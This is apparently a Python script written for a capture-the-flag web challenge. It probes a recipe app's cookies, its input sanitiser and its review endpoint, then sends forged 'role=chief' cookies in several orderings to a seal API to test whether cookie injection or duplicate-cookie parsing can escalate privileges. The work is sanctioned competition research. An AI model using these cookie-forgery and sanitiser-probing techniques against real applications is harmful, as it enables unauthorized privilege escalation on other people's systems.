#!/usr/bin/env python3
"""Re-measure the four primitives every injection idea is built on.

The archive's claims about them came from a run that later turned out to have measured a
truncated "overflow" batch, so they are assumptions again: (1) which Set-Cookie attributes
the app really sends - whether `role` is HttpOnly decides if mixer.js can overwrite the
inspector's role in its own jar; (2) exactly which ASCII characters survive the ingredient
sanitiser, because a surviving ';' or space means we also control cookie *attributes*, not
just name=value; (3) whether loading /review/<id> as the owner changes status, which is the
only explanation available for a batch ending 'reviewed' with no seal; (4) whether a
role=chief cookie with my valid session changes /api/seal - the previous test sent the
cookies as duplicates, and Express's cookie parser keeps the LAST pair, so a root-path
real role would always mask the injected one and the result proved nothing.
"""
import json
import re
import socket
import ssl
import sys
import time
import urllib.parse

from cc import Client, new_baker

HOST = "tomorrow.web.2026.sunshinectf.games"


def w(*a):
    sys.stdout.buffer.write((" ".join(str(x) for x in a) + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


def sendraw(method, path, headers, body=None):
    """One raw HTTP/1.1 request, response headers verbatim."""
    ctx = ssl.create_default_context()
    s = ctx.wrap_socket(socket.create_connection((HOST, 443), 25), server_hostname=HOST)
    lines = ["%s %s HTTP/1.1" % (method, path), "Host: " + HOST, "Connection: close"]
    lines += headers
    raw = "\r\n".join(lines) + "\r\n"
    if body is not None:
        raw += "Content-Length: %d\r\n\r\n" % len(body) + body
    else:
        raw += "\r\n"
    s.sendall(raw.encode())
    buf = b""
    while True:
        try:
            d = s.recv(65536)
        except Exception:
            break
        if not d:
            break
        buf += d
    s.close()
    head, _, rest = buf.partition(b"\r\n\r\n")
    return head.decode("latin-1"), rest.decode("utf-8", "replace")


u, c, _ = new_baker("ms")
w("user %s" % u)

w("=== 1. Set-Cookie attributes, verbatim ===")
CK = "Cookie: session=%s; role=%s" % (c.jar.get("session"), c.jar.get("role"))
for label, method, path, body, hdr in [
    ("register", "POST", "/register", '{"username":"mszz%s","password":"Passw0rd!"}' % int(time.time() % 1000),
     ["Content-Type: application/json"]),
    ("login", "POST", "/login", json.dumps({"username": u, "password": "Passw0rd!"}),
     ["Content-Type: application/json"]),
    ("logout", "POST", "/logout", "", ["Content-Type: application/json", CK]),
]:
    head, _ = sendraw(method, path, hdr, body)
    w("  %-9s %s" % (label, head.split("\r\n")[0]))
    for line in head.split("\r\n"):
        if line.lower().startswith("set-cookie"):
            w("            %s" % line)
    time.sleep(0.5)

# the raw logout/login above replaced the server-side session; re-authenticate through
# the Client so its jar holds a live token again before measuring anything else.
w("  re-login -> %s" % (c.post("/login", {"username": u, "password": "Passw0rd!"})[:2],))

w("=== 2. which ASCII characters survive in name / value? ===")
chars = list("!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ \t") + ["==", " ", "  "]
probe = [{"name": "k%02d%sTAIL" % (i, ch), "value": "v%02d%sTAIL" % (i, ch)}
         for i, ch in enumerate(chars)]
code, out, dt = c.post("/api/recipe", {"title": "charset", "ingredients": probe})
w("  save -> %s %s" % (code, str(out)[:120]))
rid = out["id"]
code, page, dt = c.get("/review/%s" % rid)
m = re.search(r"window\.__recipe = (\{.*?\});\n</script>", page, re.S)
got = json.loads(m.group(1))
w("  sent %d ingredients, stored %d" % (len(probe), len(got["ingredients"])))
surv, dropped = [], []
byp = {}
for ing in got["ingredients"]:
    byp.setdefault(ing["name"][:3], []).append(ing)
for i, ch in enumerate(chars):
    key = "k%02d" % i
    lst = byp.get(key) or []
    if not lst:
        w("   %-4r -> ingredient dropped entirely" % ch)
        dropped.append(ch)
        continue
    n, v = lst[0]["name"], lst[0]["value"]
    got_ch = n[len(key):-4] if len(n) >= len(key) + 4 else ""
    keep = got_ch == ch
    (surv if keep else dropped).append(ch)
    w("   %-4r name=%-20r value=%-20r %s" % (ch, n, v, "KEPT" if keep else "stripped"))

w("=== 3. does loading /review as the owner change the status? ===")
code, out, dt = c.post("/api/recipe", {"title": "stay draft", "ingredients": [{"name": "a", "value": "b"}]})
rid2 = out["id"]
def state(rid):
    code, dash, dt = c.get("/dashboard")
    blk = re.search(r"<tr>(?:(?!</tr>).)*?%s(?:(?!</tr>).)*?</tr>" % rid, dash, re.S)
    if not blk:
        return "?"
    b = blk.group(0)
    st = re.search(r'class="pill (\w+)">(\w+)</span>', b)
    seal = " ".join(re.sub(r"<[^>]+>", " ", b.split("</span>")[-1]).split())[:30]
    return (st.group(2) if st else "?", seal)
w("  before %s" % (state(rid2),))
c.get("/review/%s" % rid2)
time.sleep(2)
w("  after /review %s" % (state(rid2),))
c.get("/recipe/%s" % rid2)
time.sleep(2)
w("  after /recipe  %s" % (state(rid2),))

w("=== 4. role cookie, sole and last, with my real session ===")
for label, ck in [
    ("role=chief only", "session=%s; role=chief" % c.jar["session"]),
    ("role=chief last", "role=baker; session=%s; role=chief" % c.jar["session"]),
    ("real then chief", "session=%s; role=baker; role=chief" % c.jar["session"]),
    ("session twice chief-role", "session=%s; session=%s; role=chief" % (c.jar["session"], c.jar["session"])),
]:
    code, out, dt = c.post("/api/seal", {"recipeId": rid2}, headers={"Cookie": ck})
    w("  %-24s -> %s %s" % (label, code, str(out)[:70]))
w("done")
